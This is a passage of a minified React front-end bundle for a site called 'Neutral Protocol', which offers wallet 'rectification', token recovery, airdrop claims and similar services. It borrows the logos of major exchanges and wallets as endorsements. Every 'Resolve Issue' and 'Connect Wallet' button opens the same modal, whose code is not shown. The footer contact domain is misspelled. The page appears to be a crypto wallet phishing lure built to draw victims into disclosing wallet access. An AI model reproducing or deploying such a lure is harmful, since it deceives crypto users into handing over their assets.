								className: "text-white text-base md:text-2xl",
								children:
									"Neutral Protocol is a decentralized platform and network that blends Blockchain with DeFi, incorporating Blockchain aspects such as non-custodial management, Micropools, rapid liquidity, and decentralized governance.",
							}),
							f.jsxs("div", {
								className:
									"flex flex-col md:flex-row gap-4 md:gap-10 items-center",
								children: [
									f.jsxs("button", {
										className:
											"bg-white text-dark px-10 w-full md:w-auto flex justify-center items-center gap-2 py-4 rounded-full",
										onClick: j,
										children: [
											"Resolve Issue",
											f.jsx("svg", {
												stroke: "currentColor",
												fill: "currentColor",
												strokeWidth: "0",
												viewBox: "0 0 448 512",
												height: "1em",
												width: "1em",
												xmlns: "http://www.w3.org/2000/svg",
												children: f.jsx("path", {
													d: "M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z",
												}),
											}),
										],
									}),
									f.jsx("button", {
										className:
											"border border-gray-200/60 w-full md:w-auto flex justify-center items-center px-10 py-4 rounded-full",
										onClick: j,
										children: f.jsx("span", {
											children: "Connect Wallet",
										}),
									}),
								],
							}),
						],
					}),
				}),
			}),
			f.jsx(Cn, { isOpen: N, onClose: h }),
		],
	});
}
function Wh() {
	return f.jsx("div", {
		children: f.jsx("section", {
			className: "leaders py-20 px-6",
			children: f.jsxs("div", {
				className: "flex flex-col justify-center gap-12",
				children: [
					f.jsx("h3", {
						className:
							"text-white text-[24px] font-bold text-center",
						children: "TRUSTED BY INDUSTRY LEADERS",
					}),
					f.jsxs("section", {
						className:
							"industry flex flex-wrap justify-center items-center gap-10",
						children: [
							f.jsx("span", {
								className: "",
								children: f.jsx("img", {
									className: "w-[100%]",
									src: "/metamask2.png",
									alt: "metamask",
								}),
							}),
							f.jsx("span", {
								className: "",
								children: f.jsx("img", {
									className: "w-[100%]",
									src: "/binance.png",
									alt: "binance",
								}),
							}),
							f.jsx("span", {
								className: "",
								children: f.jsx("img", {
									className: "w-[100%]",
									src: "/polygon.png",
									alt: "polygon",
								}),
							}),
							f.jsx("span", {
								className: "",
								children: f.jsx("img", {
									className: "w-[100%]",
									src: "/walletconnect2.png",
									alt: "polygon",
								}),
							}),
							f.jsx("span", {
								className: "",
								children: f.jsx("img", {
									className: "w-[100%]",
									src: "/coinbase2.png",
									alt: "polygon",
								}),
							}),
						],
					}),
				],
			}),
		}),
	});
}
function $h() {
	const [N, C] = Vl.useState(!1),
		j = () => C(!0),
		h = () => C(!1);
	return f.jsxs("div", {
		children: [
			f.jsxs("section", {
				className:
					"solutions flex flex-col justify-center items-center gap-10 p-10",
				children: [
					f.jsx("h3", {
						className:
							"text-white text-[24px] font-bold text-center",
						children: "SOLUTIONS SUITE",
					}),
					f.jsxs("div", {
						className:
							"flex flex-row flex-wrap gap-8 p-10 justify-center items-center",
						children: [
							f.jsx("div", {
								className:
									"w-[300px] p-4 justify-center items-center flex flex-col h-[300px]",
								children: f.jsxs("div", {
									className:
										"flex flex-col justify-center items-center gap-4",
									children: [
										f.jsx("h3", {
											className: "text-purple",
											children: "Rectification",
										}),
										f.jsx("p", {
											className:
												"text-white p-4 text-center ",
											children:
												"Get real-time solutions to your wallet fundamental problems - tailored specifically to you",
										}),
										f.jsx("button", {
											className:
												"flex items-center gap-2 text-white border border-purple py-2 px-6 rounded",
											onClick: j,
											children: f.jsxs("span", {
												className:
													"flex items-center gap-4",
												children: [
													"Resolve Issue",
													f.jsx("svg", {
														stroke: "currentColor",
														fill: "currentColor",
														strokeWidth: "0",
														viewBox: "0 0 448 512",
														height: "1em",
														width: "1em",
														xmlns: "http://www.w3.org/2000/svg",
														children: f.jsx(
															"path",
															{
																d: "M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z",
															}
														),
													}),
												],
											}),
										}),
									],
								}),
							}),
							f.jsx("div", {
								className:
									"w-[300px] p-4 justify-center items-center flex flex-col h-[300px]",
								children: f.jsxs("div", {
									className:
										"flex flex-col justify-center items-center gap-4",
									children: [
										f.jsx("h3", {
											className: "text-purple",
											children: "Restore Token",
										}),
										f.jsx("p", {
											className:
												"text-white p-4 text-center",
											children:
												"Lets help you restore your tokens",
										}),
										f.jsx("button", {
											className:
												"flex items-center gap-2 text-white border border-purple py-2 px-6 rounded",
											onClick: j,
											children: f.jsxs("span", {
												className:
													"flex items-center gap-4",
												children: [
													"Resolve Issue",
													f.jsx("svg", {
														stroke: "currentColor",
														fill: "currentColor",
														strokeWidth: "0",
														viewBox: "0 0 448 512",
														height: "1em",
														width: "1em",
														xmlns: "http://www.w3.org/2000/svg",
														children: f.jsx(
															"path",
															{
																d: "M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z",
															}
														),
													}),
												],
											}),
										}),
									],
								}),
							}),
							f.jsx("div", {
								className:
									"w-[300px] p-4 justify-center items-center flex flex-col h-[300px]",
								children: f.jsxs("div", {
									className:
										"flex flex-col justify-center items-center gap-4",
									children: [
										f.jsx("h3", {
											className: "text-purple",
											children: "Claim Token",
										}),
										f.jsx("p", {
											className:
												"text-white p-4 text-center",
											children:
												"Claim crypto tokens, as fast as lightening",
										}),
										f.jsx("button", {
											className:
												"flex items-center gap-2 text-white border border-purple py-2 px-6 rounded",
											onClick: j,
											children: f.jsxs("span", {
												className:
													"flex items-center gap-4",
												children: [
													"Resolve Issue",
													f.jsx("svg", {
														stroke: "currentColor",
														fill: "currentColor",
														strokeWidth: "0",
														viewBox: "0 0 448 512",
														height: "1em",
														width: "1em",
														xmlns: "http://www.w3.org/2000/svg",
														children: f.jsx(
															"path",
															{
																d: "M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z",
															}
														),
													}),
												],
											}),
										}),
									],
								}),
							}),
							f.jsx("div", {
								className:
									"w-[300px] p-4 justify-center items-center flex flex-col h-[300px]",
								children: f.jsxs("div", {
									className:
										"flex flex-col justify-center items-center gap-4",
									children: [
										f.jsx("h3", {
											className: "text-purple",
											children: "Claim Airdrops",
										}),
										f.jsx("p", {
											className:
												"text-white p-4 text-center",
											children:
												"Claim the world’s most current and legitimate cryptocurrency airdrops.",
										}),
										f.jsx("button", {
											className:
												"flex items-center gap-2 text-white border border-purple py-2 px-6 rounded",
											onClick: j,
											children: f.jsxs("span", {
												className:
													"flex items-center gap-4",
												children: [
													"Resolve Issue",
													f.jsx("svg", {
														stroke: "currentColor",
														fill: "currentColor",
														strokeWidth: "0",
														viewBox: "0 0 448 512",
														height: "1em",
														width: "1em",
														xmlns: "http://www.w3.org/2000/svg",
														children: f.jsx(
															"path",
															{
																d: "M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z",
															}
														),
													}),
												],
											}),
										}),
									],
								}),
							}),
							f.jsx("div", {
								className:
									"w-[300px] p-4 justify-center items-center flex flex-col h-[300px]",
								children: f.jsxs("div", {
									className:
										"flex flex-col justify-center items-center gap-4",
									children: [
										f.jsx("h3", {
											className: "text-purple",
											children: "Validate",
										}),
										f.jsx("p", {
											className:
												"text-white p-4 text-center",
											children:
												"Verify a transaction Validity and confirm if it has been correctly included in the blockchain.",
										}),
										f.jsx("button", {
											className:
												"flex items-center gap-2 text-white border border-purple py-2 px-6 rounded",
											onClick: j,
											children: f.jsxs("span", {
												className:
													"flex items-center gap-4",
												children: [
													"Resolve Issue",
													f.jsx("svg", {
														stroke: "currentColor",
														fill: "currentColor",
														strokeWidth: "0",
														viewBox: "0 0 448 512",
														height: "1em",
														width: "1em",
														xmlns: "http://www.w3.org/2000/svg",
														children: f.jsx(
															"path",
															{
																d: "M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z",
															}
														),
													}),
												],
											}),
										}),
									],
								}),
							}),
							f.jsx("div", {
								className:
									"w-[300px] p-4 justify-center items-center flex flex-col h-[300px]",
								children: f.jsxs("div", {
									className:
										"flex flex-col justify-center items-center gap-4",
									children: [
										f.jsx("h3", {
											className: "text-purple",
											children: "Mint NFT",
										}),
										f.jsx("p", {
											className:
												"text-white p-4 text-center",
											children:
												"Create and deploy Non Fungible Tokens on the Blockchain",
										}),
										f.jsx("button", {
											className:
												"flex items-center gap-2 text-white border border-purple py-2 px-6 rounded",
											onClick: j,
											children: f.jsxs("span", {
												className:
													"flex items-center gap-4",
												children: [
													"Resolve Issue",
													f.jsx("svg", {
														stroke: "currentColor",
														fill: "currentColor",
														strokeWidth: "0",
														viewBox: "0 0 448 512",
														height: "1em",
														width: "1em",
														xmlns: "http://www.w3.org/2000/svg",
														children: f.jsx(
															"path",
															{
																d: "M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z",
															}
														),
													}),
												],
											}),
										}),
									],
								}),
							}),
							f.jsx("div", {
								className:
									"w-[300px] p-4 justify-center items-center flex flex-col h-[300px]",
								children: f.jsxs("div", {
									className:
										"flex flex-col justify-center items-center gap-4",
									children: [
										f.jsx("h3", {
											className: "text-purple",
											children: "Stake tokens",
										}),
										f.jsx("p", {
											className:
												"text-white p-4 text-center",
											children:
												"Stake decentralised tokens and earn from your assets.",
										}),
										f.jsx("button", {
											className:
												"flex items-center gap-2 text-white border border-purple py-2 px-6 rounded",
											onClick: j,
											children: f.jsxs("span", {
												className:
													"flex items-center gap-4",
												children: [
													"Resolve Issue",
													f.jsx("svg", {
														stroke: "currentColor",
														fill: "currentColor",
														strokeWidth: "0",
														viewBox: "0 0 448 512",
														height: "1em",
														width: "1em",
														xmlns: "http://www.w3.org/2000/svg",
														children: f.jsx(
															"path",
															{
																d: "M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z",
															}
														),
													}),
												],
											}),
										}),
									],
								}),
							}),
							f.jsx("div", {
								className:
									"w-[300px] p-4 justify-center items-center flex flex-col h-[300px]",
								children: f.jsxs("div", {
									className:
										"flex flex-col justify-center items-center gap-4",
									children: [
										f.jsx("h3", {
											className: "text-purple",
											children: "Fast Exchange",
										}),
										f.jsx("p", {
											className:
												"text-white p-4 text-center",
											children:
												"Buy crypto and exchange with us.",
										}),
										f.jsx("button", {
											className:
												"flex items-center gap-2 text-white border border-purple py-2 px-6 rounded",
											onClick: j,
											children: f.jsxs("span", {
												className:
													"flex items-center gap-4",
												children: [
													"Resolve Issue",
													f.jsx("svg", {
														stroke: "currentColor",
														fill: "currentColor",
														strokeWidth: "0",
														viewBox: "0 0 448 512",
														height: "1em",
														width: "1em",
														xmlns: "http://www.w3.org/2000/svg",
														children: f.jsx(
															"path",
															{
																d: "M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z",
															}
														),
													}),
												],
											}),
										}),
									],
								}),
							}),
							f.jsx("div", {
								className:
									"w-[300px] p-4 justify-center items-center flex flex-col h-[300px]",
								children: f.jsxs("div", {
									className:
										"flex flex-col justify-center items-center gap-4",
									children: [
										f.jsx("h3", {
											className: "text-purple",
											children: "Unstake",
										}),
										f.jsx("p", {
											className:
												"text-white p-4 text-center",
											children:
												"Create and deploy Non Fungible Tokens on the Ethereum Blockchain",
										}),
										f.jsx("button", {
											className:
												"flex items-center gap-2 text-white border border-purple py-2 px-6 rounded",
											onClick: j,
											children: f.jsxs("span", {
												className:
													"flex items-center gap-4",
												children: [
													"Resolve Issue",
													f.jsx("svg", {
														stroke: "currentColor",
														fill: "currentColor",
														strokeWidth: "0",
														viewBox: "0 0 448 512",
														height: "1em",
														width: "1em",
														xmlns: "http://www.w3.org/2000/svg",
														children: f.jsx(
															"path",
															{
																d: "M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z",
															}
														),
													}),
												],
											}),
										}),
									],
								}),
							}),
							f.jsx("div", {
								className:
									"w-[300px] p-4 justify-center items-center flex flex-col h-[300px]",
								children: f.jsxs("div", {
									className:
										"flex flex-col justify-center items-center gap-4",
									children: [
										f.jsx("h3", {
											className: "text-purple",
											children: "Migration",
										}),
										f.jsx("p", {
											className:
												"text-white p-4 text-center",
											children:
												"Swap your cryptocurrency tokens from one blockchain to another.",
										}),
										f.jsx("button", {
											className:
												"flex items-center gap-2 text-white border border-purple py-2 px-6 rounded",
											onClick: j,
											children: f.jsxs("span", {
												className:
													"flex items-center gap-4",
												children: [
													"Resolve Issue",
													f.jsx("svg", {
														stroke: "currentColor",
														fill: "currentColor",
														strokeWidth: "0",
														viewBox: "0 0 448 512",
														height: "1em",
														width: "1em",
														xmlns: "http://www.w3.org/2000/svg",
														children: f.jsx(
															"path",
															{
																d: "M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z",
															}
														),
													}),
												],
											}),
										}),
									],
								}),
							}),
							f.jsx("div", {
								className:
									"w-[300px] p-4 justify-center items-center flex flex-col h-[300px]",
								children: f.jsxs("div", {
									className:
										"flex flex-col justify-center items-center gap-4",
									children: [
										f.jsx("h3", {
											className: "text-purple",
											children: "Bridge",
										}),
										f.jsx("p", {
											className:
												"text-white p-4 text-center",
											children:
												"Unlimited transfers across chains for tokens and NFTs wrapped by Wormhole.",
										}),
										f.jsx("button", {
											className:
												"flex items-center gap-2 text-white border border-purple py-2 px-6 rounded",
											onClick: j,
											children: f.jsxs("span", {
												className:
													"flex items-center gap-4",
												children: [
													"Resolve Issue",
													f.jsx("svg", {
														stroke: "currentColor",
														fill: "currentColor",
														strokeWidth: "0",
														viewBox: "0 0 448 512",
														height: "1em",
														width: "1em",
														xmlns: "http://www.w3.org/2000/svg",
														children: f.jsx(
															"path",
															{
																d: "M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z",
															}
														),
													}),
												],
											}),
										}),
									],
								}),
							}),
							f.jsx("div", {
								className:
									"w-[300px] p-4 justify-center items-center flex flex-col h-[300px]",
								children: f.jsxs("div", {
									className:
										"flex flex-col justify-center items-center gap-4",
									children: [
										f.jsx("h3", {
											className: "text-purple",
											children: "Recovery",
										}),
										f.jsx("p", {
											className:
												"text-white p-4 text-center",
											children:
												"Recover Crypto, Tokens & Non Fungible Tokens with neutral Network.",
										}),
										f.jsx("button", {
											className:
												"flex items-center gap-2 text-white border border-purple py-2 px-6 rounded",
											onClick: j,
											children: f.jsxs("span", {
												className:
													"flex items-center gap-4",
												children: [
													"Resolve Issue",
													f.jsx("svg", {
														stroke: "currentColor",
														fill: "currentColor",
														strokeWidth: "0",
														viewBox: "0 0 448 512",
														height: "1em",
														width: "1em",
														xmlns: "http://www.w3.org/2000/svg",
														children: f.jsx(
															"path",
															{
																d: "M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z",
															}
														),
													}),
												],
											}),
										}),
									],
								}),
							}),
						],
					}),
				],
			}),
			f.jsx(Cn, { isOpen: N, onClose: h }),
		],
	});
}
function Fh() {
	const [N, C] = Vl.useState(!1),
		j = () => C(!0),
		h = () => C(!1);
	return f.jsxs("section", {
		className: "caters",
		children: [
			f.jsx("div", {
				className: "flex justify-end",
				style: {
					backgroundImage: "url('/bg2.png')",
					backgroundSize: "cover",
					backgroundPosition: "center",
					backgroundRepeat: "no-repeat",
					borderRadius: "8px",
				},
				children: f.jsxs("section", {
					className:
						"body w-full md:w-3/5 p-6 md:p-20 text-center md:text-left flex flex-col justify-center items-center md:items-start gap-6 md:gap-[30px]",
					style: { color: "#fff" },
					children: [
						f.jsx("h1", {
							className: "text-2xl md:text-[40px] font-bold",
							children:
								"Neutral protocol caters for everything you need.",
						}),
						f.jsx("p", {
							className: "text-base md:text-xl",
							children:
								"Cryptocurrency wallets provide users with a digital solution for storing and managing blockchain assets and cryptocurrencies. These wallets allow users to spend, receive, and trade cryptocurrencies.",
						}),
						f.jsx("div", {
							className: "button_container w-full md:w-auto",
							children: f.jsx("button", {
								className:
									"bg-white text-dark w-full md:w-auto px-10 flex justify-center items-center gap-2 py-4 rounded-full mx-0 md:mx-6",
								onClick: j,
								children: "Resolve Issue",
							}),
						}),
					],
				}),
			}),
			f.jsx(Cn, { isOpen: N, onClose: h }),
		],
	});
}
function Ih() {
	return f.jsxs("section", {
		className:
			"flex flex-col md:flex-row w-full justify-center md:justify-around items-center gap-4 md:gap-10 p-6 md:p-10 text-dark text-center md:text-left",
		children: [
			f.jsx("span", { children: "Copyright @2024 Neutral Protocol" }),
			f.jsxs("p", {
				children: [
					f.jsx("i", {
						className: "text-purple",
						children: "Neutral Protocol Web3 Technology.",
					}),
					" AB Org.nr: 559307-5988",
				],
			}),
			f.jsx("b", { children: "Reach out: hello@neutalprotocol.com" }),
		],
	});
}
function Ph() {
	const [N, C] = Vl.useState(0);
	return f.jsxs(f.Fragment, {
		children: [
			f.jsx(Jh, {}),
			f.jsx(kh, {}),
			f.jsx(Wh, {}),
			f.jsx($h, {}),
			f.jsx(Fh, {}),
			f.jsx(Ih, {}),
		],
	});
}
Yh.createRoot(document.getElementById("root")).render(
	f.jsx(Vl.StrictMode, { children: f.jsx(Ph, {}) })
);
